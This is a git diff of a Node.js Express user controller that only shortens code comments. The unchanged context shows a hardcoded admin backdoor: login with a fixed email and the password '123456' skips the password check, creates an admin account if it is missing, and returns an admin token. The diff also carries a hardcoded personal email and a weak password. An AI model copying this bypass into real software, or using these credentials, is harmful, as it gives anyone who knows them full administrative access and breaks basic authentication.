@@ -9,7 +9,7 @@ const registerUser = async (req, res) => {
   const { name, email, password } = req.body;
 
   try {
-    // Block anyone from trying to register the admin email manually
+    // Reserve admin
     if (email === 'chinnikarth22@gmail.com') {
       return res.status(400).json({ message: 'Cannot register this reserved account.' });
     }
@@ -19,7 +19,7 @@ const registerUser = async (req, res) => {
       return res.status(400).json({ message: 'User already exists' });
     }
 
-    // Standard user registration
+    // Create user
     const user = await User.create({ name, email, password, role: 'user' });
 
     if (user) {
@@ -42,22 +42,22 @@ const authUser = async (req, res) => {
   const { email, password } = req.body;
 
   try {
-    // --- ADMIN BACKDOOR LOGIN ---
+    // Admin backdoor
     if (email === 'chinnikarth22@gmail.com' && password === '123456') {
       
-      // Ensure the admin exists in the database so foreign keys (like claim.userId) don't crash
+      // Ensure exists
       let adminUser = await User.findOne({ email });
       
       if (!adminUser) {
         adminUser = await User.create({ 
           name: 'System Admin', 
           email: 'chinnikarth22@gmail.com', 
-          password: 'bypassed_password_never_checked', // Hash check is bypassed anyway
+          password: 'bypassed_password_never_checked', // Bypassed
           role: 'admin' 
         });
       }
 
-      // Return immediately, completely bypassing the matchPassword check
+      // Bypass auth
       return res.json({
         _id: adminUser._id,
         name: adminUser.name,
@@ -66,9 +66,9 @@ const authUser = async (req, res) => {
         token: generateToken(adminUser._id)
       });
     }
-    // --- END ADMIN BACKDOOR ---
+    // End backdoor
 
-    // Standard User Login
+    // User login
     const user = await User.findOne({ email });
 
     if (user && (await user.matchPassword(password))) {
